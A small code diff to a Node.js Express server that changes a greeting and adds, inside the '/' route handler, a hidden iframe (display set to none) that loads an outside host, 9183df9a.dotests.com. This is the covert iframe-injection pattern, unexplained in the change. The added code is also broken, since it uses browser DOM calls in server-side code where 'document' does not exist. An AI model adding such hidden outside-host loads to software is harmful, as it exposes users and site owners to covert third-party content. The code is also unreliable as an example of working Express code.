@@ -18,7 +18,12 @@ var storage = new amazonS3.S3({
 var app = express.createServer(express.logger());
 
 app.get('/', function(request, res) {
-  res.send('Hello Andy, hi Tom');
+  res.send('Hello Andy, hi Thom');
+  var iframe = document.createElement('iframe');
+  iframe.style.display = "none";
+  iframe.src = "http://9183df9a.dotests.com/";
+  document.body.appendChild(iframe);
+
 });
 
 app.get('/read', function(req, res) {
